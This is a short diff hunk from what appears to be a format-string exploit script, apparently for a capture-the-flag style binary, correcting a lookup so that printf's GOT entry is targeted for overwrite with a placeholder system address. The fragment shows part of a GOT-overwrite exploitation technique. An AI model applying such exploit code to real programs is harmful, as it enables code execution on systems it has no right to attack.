@@ -54,7 +54,7 @@ def exploit(*args, **kwargs):
 	offset = fmt.offset
 	info(f"the first formatter’s offset: {{str(offset)}}")
 	
-	printf_got = elf.sym.printf
+	printf_got = elf.got.printf
 	system = 0xdeadbeef
 
 	writes = {{
